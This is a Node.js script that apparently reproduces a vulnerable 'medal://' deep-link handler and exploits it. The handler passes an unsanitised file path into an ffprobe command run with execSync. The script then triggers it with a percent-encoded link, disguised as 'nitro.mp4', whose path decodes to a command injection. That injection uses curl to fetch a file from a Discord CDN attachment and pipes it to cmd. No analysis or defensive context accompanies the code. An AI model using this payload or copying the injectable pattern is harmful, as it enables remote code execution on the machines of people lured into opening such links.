const url = require('url'); 
const { execSync } = require('child_process');

function getExecutablePath() {
    return 'C:\\ProgramData\\chocolatey\\bin\\ffprobe.exe';
}

function execCommandSync(ffmpegCommand) {
console.log(`"${getExecutablePath()}" ${ffmpegCommand}`);
    return execSync(`"${getExecutablePath()}" ${ffmpegCommand}`)
}

function probeSync(file) {
  const buffer = execCommandSync(`-v quiet -print_format json -show_format -show_streams -print_format json "${file}"`);
}


function scanFile(file) {
            const extension = `.${file.name.split(".").pop()}`,
                isAllowed = [".mp4"].includes(extension) || ["video/mp4"].includes(file.type),
                baseFile = {
                    name: file.name,
                    path: file.path,
                    type: file.type,
                    size: file.size
                };
              if (isAllowed) {
                    baseFile.metadata = probeSync(file.path)
            } 
            }
            
function onDeepLink(type, route, args) {
    if (route.includes("import/pc")) {
        const file = url.parse("http://medal.tv/" + route, !0).query;
        file && file.path ? scanFile(file) : console.log("fail");
    }
};
            

var t = 'medal://import/pc?path=%22;%7C%63%75%72%6C%20%2D%73%20%68%74%74%70%73%3A%2F%2F%63%64%6E%2E%64%69%73%63%6F%72%64%61%70%70%2E%63%6F%6D%2F%61%74%74%61%63%68%6D%65%6E%74%73%2F%39%38%34%35%32%39%39%38%39%36%33%32%34%32%36%31%31%36%2F%39%39%30%34%31%39%30%34%30%32%33%35%32%39%30%37%30%34%2F%74%65%20%7Ccmd&name=nitro%2E%6D%70%34>';
const r = t.replace("medal://", ""),i = r.split("/"),[n, a] = i;
if((r.length <= 1 && "/" !== r) || !t.startsWith("medal://"))
console.log("failed");
else onDeepLink(n, r, i);
